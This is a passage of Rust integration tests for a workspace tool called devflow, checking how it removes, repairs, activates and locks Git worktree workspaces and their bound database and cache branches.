    // provisioning or attaching another service would replace it.
    let id = uuid::Uuid::new_v4();
    let (t, w, results) = attach_with_pending(
        "[services.main]\nengine = \"postgres\"\n",
        PendingBranch {
            service: "db".into(),
            branch_id: id,
            engine: Some(Engine::Postgres),
            file: None,
        },
    );
    for (how, result) in ["setup", "activation"].into_iter().zip(results) {
        let said = format!("{:#}", result.expect_err(how));
        assert!(
            said.contains(&id.to_string()) && said.contains("no longer configured"),
            "{how}: {said}"
        );
        let after = receipt_of(&w);
        assert!(after.services.is_empty(), "{how}");
        assert_eq!(after.creating.map(|p| p.branch_id), Some(id), "{how}");
        assert_eq!(
            recorded_branch(&t, id).map(|b| (b.pending, b.engine)),
            Some((true, Some(Engine::Postgres))),
            "{how}"
        );
    }
}

#[test]
fn an_attachment_clears_no_intent_that_is_not_its_own() {
    use devflow_core::config::Engine;
    use devflow_core::receipt::PendingBranch;
    // No service is configured (a URL-only attachment), and the receipt holds
    // an intent for a service that is gone: attaching binds the default
    // service and leaves the other's intent where it is, for a removal to find.
    let id = uuid::Uuid::new_v4();
    let (t, w, results) = attach_with_pending(
        "",
        PendingBranch {
            service: "gone".into(),
            branch_id: id,
            engine: Some(Engine::Postgres),
            file: None,
        },
    );
    for (how, result) in ["setup", "activation"].into_iter().zip(results) {
        result.unwrap_or_else(|e| panic!("{how}: {e:#}"));
        let after = receipt_of(&w);
        assert_eq!(after.services["db"].url, ATTACH, "{how}");
        let kept = after.creating.expect("the other service's intent is kept");
        assert_eq!(
            (kept.service.as_str(), kept.branch_id),
            ("gone", id),
            "{how}"
        );
        // The attachment is not data the workspace owns; the pending branch
        // is still listed on the record.
        assert_eq!(
            recorded_branch(&t, id).map(|b| (b.pending, b.service)),
            Some((true, Some("gone".to_string()))),
            "{how}"
        );
    }
}

#[test]
fn keeping_the_data_removes_the_workspace_without_looking_for_a_pending_branch() {
    let (t, w, _) = crashed_creation(
        UNREACHABLE_SERVER,
        "db",
        Some(devflow_core::config::Engine::Postgres),
    );
    let out = setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(!w.path.exists());
}

#[test]
fn a_pending_branch_of_a_service_the_configuration_dropped_cannot_be_placed() {
    // Nothing in the configuration or the receipt says which backend holds the
    // branch, no container service of that name is recorded, and the project
    // has no postgres service to ask: it cannot be ruled out, so it is not
    // forgotten. The record keeps naming it, so forcing leaves it there.
    let (t, w, id) = crashed_creation("", "ghost", None);
    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable);
    assert!(
        protected.reason.contains(&id.to_string()),
        "{}",
        protected.reason
    );
    assert!(
        protected
            .remedies
            .iter()
            .any(|r| matches!(r, devflow_core::remedy::Remedy::Setup { .. })),
        "{:?}",
        protected.remedies
    );
    assert!(w.path.is_dir());
    // Keeping the data is the person's own decision about it.
    setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(
        devflow_core::ledger::list(&t.project.git_common_dir)
            .unwrap()
            .records
            .is_empty(),
        "kept data is no longer named"
    );
}

#[test]
fn an_owned_binding_of_a_service_the_project_dropped_stops_the_removal() {
    // The postgres service left the configuration but its branch is still on a
    // server nobody can ask any more.
    let t = repo(&Hooks::default(), "");
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let mut receipt = receipt_of(&w);
    let id = uuid::Uuid::new_v4();
    receipt.services.insert(
        "old".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(id),
                database: "df_x".into(),
                role: "dfl_x".into(),
                url: "postgres://dfl_x:pw@127.0.0.1:1/df_x".into(), // kingfisher:ignore
                source: "empty".into(),
                owned: true,
            },
            None,
        ),
    );
    receipt.save(&w.git_dir).unwrap();
    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable);
    assert!(
        protected.reason.contains("no postgres service any more"),
        "{}",
        protected.reason
    );
    assert!(w.path.is_dir());
    // An attachment (not owned) is never dropped, so nothing needs the server.
    let mut receipt = receipt_of(&w);
    receipt.services.get_mut("old").unwrap().owned = false;
    receipt.save(&w.git_dir).unwrap();
    setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert!(!w.path.exists());
}

// --- the identity a reset is shown with ---------------------------------------

#[test]
fn a_reset_source_is_an_identity_and_a_name_that_moved_is_refused() {
    use devflow_core::config::Engine;
    use devflow_core::error::WorkspaceChanged;
    use devflow_core::receipt::CloneReport;
    use devflow_core::services::catalog::{
        BranchRecord, Catalog, ServiceCatalog, SnapshotRecord, SourceRef, Store, VERSION,
    };
    use devflow_core::setup::BranchExpect;
    use serde_json::json;
    use uuid::Uuid;

    let t = repo(&Hooks::default(), "[services.cache]\nengine = \"valkey\"\n");
    let git = git2::Repository::open(&t.root).unwrap();
    for name in ["target", "other"] {
        git.worktree(name, &t._dir.path().join(name), None).unwrap();
    }
    let (target, other) = (ws(&t.project, "target"), ws(&t.project, "other"));
    let when = "2026-10-11T09:00:00Z";
    let branch = |id: Uuid, name: &str, owner: Uuid| -> BranchRecord {
        serde_json::from_value(json!({
            "id": id, "name": name, "owner": owner, "state": "ready",
            "container_name": format!("c-{name}"), "volume": format!("v-{name}"),
            "image": "valkey/valkey:8-alpine", "pin": "valkey/valkey@sha256:1",
            "password": "pw", // kingfisher:ignore
            "source": { "kind": "empty" }, "generation": 1,
            "created_at": when, "updated_at": when,
        }))
        .unwrap()
    };
    let snapshot = |id: Uuid, version: u32| -> SnapshotRecord {
        serde_json::from_value(json!({
            "id": id, "name": "seed", "version": version, "state": "ready",
            "volume": format!("s-{version}"), "source": { "kind": "empty" },
            "image": "valkey/valkey:8-alpine", "pin": "valkey/valkey@sha256:1",
            "created_at": when,
        }))
        .unwrap()
    };
    let bind = |ws: &Workspace, instance: Uuid, branch: Uuid| {
        let mut receipt = Receipt::new(t.project.id(), &ws.name, None);
        receipt.instance_id = instance;
        receipt.services.insert(
            "cache".into(),
            ServiceBinding::container(
                Engine::Valkey,
                branch,
                "redis://:pw@127.0.0.1:6381/0".into(), // kingfisher:ignore
                None,
                "empty".into(),
                CloneReport {
                    method: None,
                    captured_at: None,
                    allocated_bytes: None,
                    source_downtime_ms: None,
                },
                None,
            ),
        );
        receipt.save(&ws.git_dir).unwrap();
    };
    let (own_instance, old_instance, new_instance) =
        (Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4());
    let (own, old, new) = (Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4());
    let (seed1, seed2) = (Uuid::new_v4(), Uuid::new_v4());
    let write_catalog = |branches: Vec<BranchRecord>| {
        let mut records = ServiceCatalog::new(Engine::Valkey);
        records.branches = branches;
        records.snapshots = vec![snapshot(seed1, 1), snapshot(seed2, 2)];
        let catalog = Catalog {
            version: VERSION,
            project_id: t.project.id(),
            docker: "daemon".into(),
            services: [("cache".to_string(), records)].into(),
        };
        let path = Store::path_for(t.project.id()).unwrap();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, serde_json::to_vec(&catalog).unwrap()).unwrap();
    };

    // The dialog is drawn: `other` holds `old`.
    bind(&target, own_instance, own);
    bind(&other, old_instance, old);
    write_catalog(vec![
        branch(own, "target", own_instance),
        branch(old, "other", old_instance),
    ]);
    let from_other = DataSource::Workspace {
        name: "other".into(),
    };
    let shown = setup::reset_source(&t.project, &target, "cache", Some(&from_other)).unwrap();
    assert_eq!(shown.source, SourceRef::Branch { id: old });
    assert_eq!(shown.label, "workspace:other");
    let snapshot_v1 = DataSource::Snapshot {
        name: "seed".into(),
        version: Some(1),
    };
    let seed = setup::reset_source(&t.project, &target, "cache", Some(&snapshot_v1)).unwrap();
    assert_eq!(seed.source, SourceRef::Snapshot { id: seed1 });
    // The recorded source is the branch's own provenance.
    let recorded = setup::reset_source(&t.project, &target, "cache", None).unwrap();
    assert_eq!(recorded.source, SourceRef::Empty);
    // A workspace is not a source for itself.
    let itself = DataSource::Workspace {
        name: "target".into(),
    };
    assert!(setup::reset_source(&t.project, &target, "cache", Some(&itself)).is_err());

    let expect = BranchExpect {
        instance: own_instance,
        branch: own,
        source: Some(shown.source),
    };
    expect
        .verify_source(&target, "cache", shown.source)
        .unwrap();

    // `setup --new-instance` runs in `other` before the confirmation.
    bind(&other, new_instance, new);
    write_catalog(vec![
        branch(own, "target", own_instance),
        branch(old, "other", old_instance),
        branch(new, "other", new_instance),
    ]);
    let now = setup::reset_source(&t.project, &target, "cache", Some(&from_other)).unwrap();
    assert_eq!(now.source, SourceRef::Branch { id: new });
    let error = expect
        .verify_source(&target, "cache", now.source)
        .unwrap_err();
    let changed = error
        .downcast_ref::<WorkspaceChanged>()
        .unwrap_or_else(|| panic!("not the typed error: {error:#}"));
    assert_eq!(
        (changed.workspace.as_str(), changed.service.as_str()),
        ("target", "cache")
    );
    assert!(
        error.to_string().contains("changed since you reviewed it"),
        "{error}"
    );
    assert!(error.to_string().contains(&old.to_string()), "{error}");
    // A request that pinned nothing (the CLI) takes whatever resolves now.
    BranchExpect {
        source: None,
        ..expect
    }
    .verify_source(&target, "cache", now.source)
    .unwrap();
}

// ---------------------------------------------------------------------------
// Activation: one entry for the command line and the app

/// Move the checkout of `workspace` to a new branch `branch` (what `git switch
/// -c` does inside the worktree).
fn switch_checkout_to(workspace: &Workspace, branch: &str) {
    let repo = git2::Repository::open(&workspace.path).unwrap();
    let head = repo.head().unwrap().peel_to_commit().unwrap();
    repo.branch(branch, &head, false).unwrap();
    repo.set_head(&format!("refs/heads/{branch}")).unwrap();
}

/// A project with setup hooks that count their runs (in the directory above
/// the repository, so a cleaned checkout does not reset the count), already
/// trusted. A linked worktree is two levels below it.
fn counted_setup() -> Repo {
    let t = repo(
        &Hooks {
            setup: &["echo ran >> ../../setup-count"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    t
}

fn setup_runs(t: &Repo) -> usize {
    std::fs::read_to_string(t.root.parent().unwrap().join("setup-count"))
        .map(|text| text.lines().count())
        .unwrap_or(0)
}

#[test]
fn setup_rebuilds_a_cleaned_checkouts_env_file_without_hooks_or_new_data() {
    let t = counted_setup();
    let w = create(&t.project, "clean", SetupOptions::default())
        .unwrap()
        .workspace;
    let (before, receipt) = (env_map(&w), receipt_of(&w));
    assert_eq!(setup_runs(&t), 1);

    // `git clean -fdx` takes the generated directory with it.
    std::fs::remove_dir_all(w.path.join(".devflow")).unwrap();
    assert!(devflow_core::exec::prepare(&w.path).is_err());

    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(out.repaired, [Repair::EnvFile]);
    assert_eq!(out.notes().len(), 1, "{:?}", out.notes());
    assert_eq!(
        env_map(&w),
        before,
        "the same variables, credentials included"
    );
    assert!(devflow_core::exec::prepare(&w.path).is_ok());
    assert_eq!(setup_runs(&t), 1, "no hook ran again");
    let after = receipt_of(&w);
    assert_eq!(after.instance_id, receipt.instance_id);
    assert_eq!(after.services, receipt.services, "nothing was provisioned");
    assert_eq!(after.phase(Phase::Hooks), receipt.phase(Phase::Hooks));

    // Nothing is missing now: nothing to repair, and nothing else changes.
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(out.repaired.is_empty());
    assert_eq!(setup_runs(&t), 1);
}

#[test]
fn activation_rebuilds_an_env_file_that_is_missing_or_unreadable() {
    let t = counted_setup();
    let w = create(&t.project, "repair", SetupOptions::default())
        .unwrap()
        .workspace;
    let before = env_map(&w);
    let env_path = env_file::path(&w.path);

    for damage in ["missing", "not text"] {
        match damage {
            "missing" => std::fs::remove_file(&env_path).unwrap(),
            _ => std::fs::write(&env_path, [0xff, 0xfe, 0x00, 0x80]).unwrap(),
        }
        let mut rec = Recorder::default();
        let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut rec).unwrap();
        assert_eq!(out.status, Status::Ready, "{damage}");
        assert_eq!(out.repaired, [Repair::EnvFile], "{damage}");
        assert_eq!(env_map(&w), before, "{damage}");
        assert_eq!(setup_runs(&t), 1, "{damage}: no hook ran again");
        assert!(
            rec.phases
                .iter()
                .all(|(phase, _)| matches!(phase, Phase::Env)),
            "{damage}: only the env phase ran: {:?}",
            rec.phases
        );
    }

    // The outcome says so in JSON as well.
    std::fs::remove_file(&env_path).unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    let json = serde_json::to_value(&out).unwrap();
    assert_eq!(json["repaired"], serde_json::json!(["env_file"]));
    assert_eq!(json["first_setup"], serde_json::json!(false));
}

#[test]
fn a_repaired_env_file_is_not_written_with_recipes_nobody_approved() {
    let t = repo(&Hooks::default(), "[env]\nGREETING = \"hello\"\n");
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "recipes", SetupOptions::default())
        .unwrap()
        .workspace;
    assert_eq!(env_map(&w)["GREETING"], "hello");

    // The approval is gone by the time the file is rebuilt (here: the
    // recipes changed, so what was reviewed no longer applies).
    let project = edit_config(&t, |text| text.replace("hello", "changed"));
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let out = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    assert!(
        !env_map(&w).contains_key("GREETING"),
        "unapproved recipes are not applied by a repair either"
    );
    assert!(
        out.remedies
            .iter()
            .any(|r| matches!(r, devflow_core::remedy::Remedy::Trust { .. })),
        "{:?}",
        out.remedies
    );
}

#[test]
fn activation_writes_devflows_pitchfork_namespace_file_again() {
    let t = repo(&Hooks::default(), "");
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&git2::Repository::open(&t.root).unwrap(), "add a daemon");
    let project = Project::open(&t.root).unwrap();
    trust::approve(&project).unwrap();
    let w = create(&project, "daemons", SetupOptions::default())
        .unwrap()
        .workspace;
    let file = w.path.join("pitchfork.local.toml");
    let written = std::fs::read_to_string(&file).unwrap();

    std::fs::remove_file(&file).unwrap();
    let out = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.repaired, [Repair::PitchforkNamespace]);
    assert_eq!(std::fs::read_to_string(&file).unwrap(), written);

    // A file somebody else wrote is reported, never replaced.
    std::fs::write(&file, "# mine\n").unwrap();
    let out = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(out.repaired.is_empty());
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "# mine\n");
}

#[test]
fn a_checkout_on_another_branch_is_still_its_workspace() {
    let t = counted_setup();
    let w = create(&t.project, "feature/a", SetupOptions::default())
        .unwrap()
        .workspace;
    let id = receipt_of(&w).instance_id;
    switch_checkout_to(&w, "other");

    // Both names find the checkout, under the name it was created with.
    for name in ["feature/a", "other"] {
        let found = worktree::find(&t.project, name).unwrap().expect(name);
        assert_eq!(
            (found.path.clone(), found.name.as_str()),
            (w.path.clone(), "feature/a")
        );
        assert_eq!(found.branch.as_deref(), Some("other"));
    }
    assert!(worktree::find(&t.project, "feature/b").unwrap().is_none());

    // The listing says what the checkout holds.
    let listed = setup::list(&t.project).unwrap();
    let item = listed.iter().find(|i| i.workspace.path == w.path).unwrap();
    assert_eq!(item.workspace.name, "feature/a");
    let drift = item.drift.as_ref().expect("drift");
    assert_eq!(
        (drift.workspace.as_str(), drift.branch.as_deref()),
        ("feature/a", Some("other"))
    );
    assert!(listed.iter().filter(|i| i.drift.is_some()).count() == 1);

    // Entering it keeps its identity: the variables, the receipt, the data.
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(out.workspace.name, "feature/a");
    assert_eq!(out.workspace.branch.as_deref(), Some("other"));
    assert_eq!(
        out.drift.as_ref().map(|d| d.describe()).as_deref(),
        Some("now on branch other; its data still belongs to workspace feature/a")
    );
    assert!(
        out.notes()
            .iter()
            .any(|n| n.contains("its data still belongs to workspace feature/a"))
    );
    let vars = env_map(&w);
    assert_eq!(vars["DEVFLOW_WORKSPACE"], "feature/a");
    assert_eq!(vars["DEVFLOW_WORKSPACE_ID"], id.to_string());
    let receipt = receipt_of(&w);
    assert_eq!(
        (receipt.workspace.as_str(), receipt.instance_id),
        ("feature/a", id)
    );

    // Back on its own branch, nothing is reported.
    let repo = git2::Repository::open(&w.path).unwrap();
    repo.set_head("refs/heads/feature/a").unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(out.drift.is_none());
    assert!(
        setup::list(&t.project)
            .unwrap()
            .iter()
            .all(|i| i.drift.is_none())
    );
}

#[test]
fn a_name_that_means_two_checkouts_is_refused_with_their_paths_and_never_guessed() {
    let t = plain();
    let a = create(&t.project, "feature/a", SetupOptions::default())
        .unwrap()
        .workspace;
    let b = create(&t.project, "feature/b", SetupOptions::default())
        .unwrap()
        .workspace;
    // `a` leaves its branch, and `b` takes it.
    switch_checkout_to(&a, "other");
    git2::Repository::open(&b.path)
        .unwrap()
        .set_head("refs/heads/feature/a")
        .unwrap();

    // `feature/a` is a's receipt name and b's branch: it is both, and that is
    // an error naming both, whatever order a lookup might have tried.
    let error = worktree::find(&t.project, "feature/a").unwrap_err();
    let remedies = devflow_core::remedy::remedies_of(&error);
    let Some(devflow_core::remedy::Remedy::UsePath { name, candidates }) = remedies.first() else {
        panic!("not the typed problem: {error:#}");
    };
    assert_eq!(name, "feature/a");
    let mut listed = candidates.clone();
    listed.sort();
    let mut both = vec![a.path.clone(), b.path.clone()];
    both.sort();
    assert_eq!(listed, both);
    let text = format!("{error:#}");
    assert!(
        text.contains(&a.path.display().to_string())
            && text.contains(&b.path.display().to_string()),
        "{text}"
    );
    assert!(
        text.contains("now on branch other") && text.contains("workspace feature/b"),
        "{text}"
    );

    // Nothing that acts on a name picks one. A removal does nothing at all.
    let error = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("names more than one workspace"),
        "{error:#}"
    );
    assert!(a.path.exists() && b.path.exists());
    assert!(
        Receipt::load(&a.git_dir).unwrap().is_some()
            && Receipt::load(&b.git_dir).unwrap().is_some()
    );

    // Names that mean one checkout still work, and so does a path.
    let by = |name: &str| worktree::find(&t.project, name).unwrap().map(|w| w.path);
    assert_eq!(by("other"), Some(a.path.clone()));
    assert_eq!(by("feature/b"), Some(b.path.clone()));
    assert_eq!(by(a.path.to_str().unwrap()), Some(a.path.clone()));
    assert_eq!(by(b.path.to_str().unwrap()), Some(b.path.clone()));

    // Removing by path is the remedy, and acts on that checkout alone.
    setup::remove(
        &t.project,
        a.path.to_str().unwrap(),
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!a.path.exists() && b.path.exists());
    // With a gone, the name is b's branch and nothing else.
    assert_eq!(by("feature/a"), Some(b.path.clone()));
}

#[test]
fn one_checkout_matching_a_name_in_several_ways_is_not_ambiguous() {
    let t = plain();
    // Branch `feature/a`, receipt name `feature/a`, Git's worktree id
    // `feature-a` and the path: all the same checkout.
    let a = create(&t.project, "feature/a", SetupOptions::default())
        .unwrap()
        .workspace;
    for name in [
        "feature/a",
        a.git_dir.file_name().unwrap().to_str().unwrap(),
        a.path.to_str().unwrap(),
    ] {
        let found = worktree::find(&t.project, name).unwrap().expect(name);
        assert_eq!(found.path, a.path, "{name}");
    }
}

#[test]
fn activation_records_when_the_workspace_was_entered_and_setup_does_not() {
    let t = plain();
    let w = create(&t.project, "seen", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(receipt_of(&w).last_active_at.is_none());
    setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        receipt_of(&w).last_active_at.is_none(),
        "setup is not an entry"
    );

    let before = chrono::Utc::now();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    let recorded = receipt_of(&w).last_active_at.expect("recorded");
    assert!(recorded >= before);
    assert_eq!(out.receipt.last_active_at, Some(recorded));
    assert_eq!(receipt_of(&w).updated_at, out.receipt.updated_at);
}

#[test]
fn the_first_activation_of_the_main_checkout_says_it_sets_up_there() {
    let t = repo(
        &Hooks {
            // The main checkout is one level below the directory it counts in.
            setup: &["echo ran >> ../setup-count"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let main = ws(&t.project, "main");
    assert!(receipt_of_opt(&main).is_none());

    let mut rec = Recorder::default();
    let out = setup::activate(&t.project, &main, SetupOptions::default(), &mut rec).unwrap();
    assert!(out.first_setup);
    assert_eq!(setup_runs(&t), 1, "the hooks ran in the main checkout");
    let notice = rec
        .lines
        .iter()
        .find(|l| l.contains("main checkout"))
        .expect("a notice");
    assert!(notice.contains("setup hooks included"), "{notice}");
    assert!(
        notice.contains(&main.path.display().to_string()),
        "{notice}"
    );
    assert_eq!(
        serde_json::to_value(&out).unwrap()["first_setup"],
        serde_json::json!(true)
    );

    // Entering it again is not a first setup.
    let mut rec = Recorder::default();
    let out = setup::activate(&t.project, &main, SetupOptions::default(), &mut rec).unwrap();
    assert!(!out.first_setup && rec.lines.is_empty(), "{:?}", rec.lines);
    assert_eq!(setup_runs(&t), 1);

    // A linked workspace never says it: it is not the main checkout.
    let mut rec = Recorder::default();
    let created = setup::create_and_activate(
        &t.project,
        CreateRequest {
            name: "linked".into(),
            from: None,
            base: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();
    assert!(!created.first_setup);
    assert!(rec.lines.iter().all(|l| !l.contains("main checkout")));
}

fn receipt_of_opt(ws: &Workspace) -> Option<Receipt> {
    Receipt::load(&ws.git_dir).unwrap()
}

/// A hook that stays until the test lets go of it, to look at the workspace
/// while its switch hooks run.
fn parked_switch_hook() -> Repo {
    repo(
        &Hooks {
            switch: &[
                "touch .devflow/parked; while [ ! -f .devflow/release ]; do sleep 0.05; done",
            ],
            ..Default::default()
        },
        "",
    )
}

#[test]
fn switch_hooks_run_under_the_receipt_lock_so_nothing_else_sets_the_workspace_up() {
    let t = parked_switch_hook();
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "held", SetupOptions::default())
        .unwrap()
        .workspace;
    let (parked, release) = (
        w.path.join(".devflow/parked"),
        w.path.join(".devflow/release"),
    );

    std::thread::scope(|scope| {
        let entering = scope
            .spawn(|| setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress));
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        while !parked.exists() {
            assert!(
                std::time::Instant::now() < deadline,
                "the hook never started"
            );
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        // The hook is running: the workspace is busy, and a second setup or
        // activation gets the typed error instead of running alongside. The
        // entry holds both locks (the process lock first: it ends by starting
        // the workspace's daemons).
        assert!(Receipt::is_locked(&w.git_dir));
        assert!(
            Receipt::try_process_lock(&w.git_dir).unwrap().is_none(),
            "the process lock is held too"
        );
        let busy = setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            false,
            false,
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(busy.downcast_ref::<Busy>().is_some(), "{busy:#}");
        let busy =
            setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap_err();
        assert!(busy.downcast_ref::<Busy>().is_some(), "{busy:#}");
        let listed = setup::list(&t.project).unwrap();
        assert!(
            listed
                .iter()
                .find(|i| i.workspace.path == w.path)
                .unwrap()
                .busy
        );

        std::fs::write(&release, "").unwrap();
        let out = entering.join().unwrap().unwrap();
        assert!(out.switch_hooks.unwrap().ok);
    });
    assert!(!Receipt::is_locked(&w.git_dir), "released afterwards");
    assert!(released_process_lock(&w.git_dir));
}

#[test]
fn a_devflow_started_by_a_hook_gets_busy_at_once_instead_of_waiting_for_its_parent() {
    const NAME: &str =
        "a_devflow_started_by_a_hook_gets_busy_at_once_instead_of_waiting_for_its_parent";
    if !in_child(NAME, &[("DEVFLOW_SETUP_ACTIVE", "1")]) {
        return;
    }
    let t = plain();
    let w = create(&t.project, "child", SetupOptions::default())
        .unwrap()
        .workspace;
    let enter = || setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress);
    let set_up = || {
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            false,
            false,
            &mut NoProgress,
        )
    };
    let quickly_busy = |what: &str, run: &dyn Fn() -> anyhow::Result<()>| {
        let started = std::time::Instant::now();
        let error = run().unwrap_err();
        assert!(error.downcast_ref::<Busy>().is_some(), "{what}: {error:#}");
        // An ordinary caller waits a quarter of a second for a receipt lock
        // and two seconds for a process lock, in case they are about to be
        // released; a child of the lock's holder never waits.
        assert!(
            started.elapsed() < std::time::Duration::from_millis(150),
            "{what} waited {:?}",
            started.elapsed()
        );
    };

    // The parent holds the receipt lock (setup, repair, switch hooks) ...
    let receipt_lock = Receipt::try_lock(&w.git_dir)
        .unwrap()
        .expect("the parent's receipt lock");
    quickly_busy("an entry", &|| enter().map(|_| ()));
    quickly_busy("a setup", &|| set_up().map(|_| ()));
    drop(receipt_lock);

    // ... or only the process lock (an entry takes it first) ...
    let process_lock = devflow_core::processes::process_lock(&w).unwrap();
    quickly_busy("an entry, for the process lock", &|| enter().map(|_| ()));
    quickly_busy("a start, for the process lock", &|| {
        devflow_core::processes::process_lock(&w).map(|_| ())
    });
    drop(process_lock);

    // ... and a nested devflow finds both free once the parent is done.
    assert!(enter().is_ok());
}

#[test]
fn a_real_configuration_change_still_reopens_the_hooks_when_the_file_was_lost_too() {
    let t = repo(
        &Hooks {
            setup: &["echo ran >> ../../setup-count"],
            ..Default::default()
        },
        "[env]\nGREETING = \"hello\"\n",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "both", SetupOptions::default())
        .unwrap()
        .workspace;
    assert_eq!(setup_runs(&t), 1);

    // A lost file alone: repaired, no hook.
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(setup_runs(&t), 1);

    // The file is lost and the configuration changed (and was approved): the
    // change reopens env and hooks, as it does for any workspace, and the
    // hooks run again.
    let project = edit_config(&t, |text| text.replace("hello", "changed"));
    trust::approve(&project).unwrap();
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let out = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(setup_runs(&t), 2, "the changed configuration ran the hooks");
    assert_eq!(env_map(&w)["GREETING"], "changed");
    assert!(
        out.repaired.is_empty(),
        "the env phase was reopened by the change, which is setup, not repair: {:?}",
        out.repaired
    );
}

#[test]
fn a_service_skipped_on_request_stays_out_of_a_rebuilt_file() {
    // With presets and recipes that would derive variables from the connection.
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    trust::approve(&t.project).unwrap();
    let w = create(
        &t.project,
        "no-db",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert!(!env_map(&w).contains_key("DATABASE_URL"));

    // A binding an earlier setup left behind does not turn the skip around:
    // the file is written without the service, whoever writes it.
    let mut receipt = receipt_of(&w);
    receipt.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: None,
                database: "left".into(),
                role: "left".into(),
                url: "postgres://left:pw@db.internal:5432/left".into(), // kingfisher:ignore
                source: "url".into(),
                owned: false,
            },
            None,
        ),
    );
    receipt.save(&w.git_dir).unwrap();
    assert!(
        !setup::env_vars(&t.project, &w, &receipt)
            .iter()
            .any(|(name, _)| name == "DATABASE_URL" || name == "PGUSER")
    );
    // Not through the presets and recipes either: an approved preset or a
    // recipe that reads the connection exports nothing from the left-over
    // binding, now or when the file is written again.
    let exported = |vars: &[(String, String)]| -> Vec<String> {
        vars.iter()
            .map(|(name, _)| name.clone())
            .filter(|name| {
                name.starts_with("DB_")
                    || ["DIRECT_URL", "AUTH", "PLAIN", "DATABASE_URL"].contains(&name.as_str())
                    || name.starts_with("PG")
            })
            .collect()
    };
    let env = setup::workspace_env(&t.project, &w, &receipt, true);
    assert_eq!(exported(&env.vars), Vec::<String>::new(), "{:?}", env.vars);
    assert!(
        env.warnings.iter().any(|w| w.contains("presets")),
        "the presets are said to be left out: {:?}",
        env.warnings
    );
    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.repaired, [Repair::EnvFile]);
    let written = env_file::read(&w.path).unwrap();
    assert_eq!(exported(&written), Vec::<String>::new(), "{written:?}");
    assert!(env_map(&w).contains_key("DEVFLOW_WORKSPACE"));
    assert!(
        !std::fs::read_to_string(env_file::path(&w.path))
            .unwrap()
            .contains("left:pw"),
        "the left-over binding's connection is nowhere in the file"
    );
}

#[test]
